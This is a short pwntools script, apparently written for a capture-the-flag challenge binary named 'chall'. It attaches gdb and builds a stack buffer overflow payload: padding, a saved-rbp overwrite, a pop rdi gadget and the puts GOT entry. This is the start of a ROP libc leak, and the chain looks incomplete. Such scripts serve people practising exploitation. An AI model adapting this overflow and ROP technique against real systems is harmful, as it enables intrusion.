from pwn import * 

binary = "./chall"
p = process(binary) 
elf = ELF(binary)
s = '''
b * vuln+50
'''
gdb.attach(p, s)
pause()
pop_rdi = 0x00000000004012c3
payload = flat(
    b'A' * 0x70, # reaches old rbp
    b'B' * 8, # rewriting the old rbp
    pop_rdi,
    elf.got['puts']
)
p.sendline(payload)
p.interactive()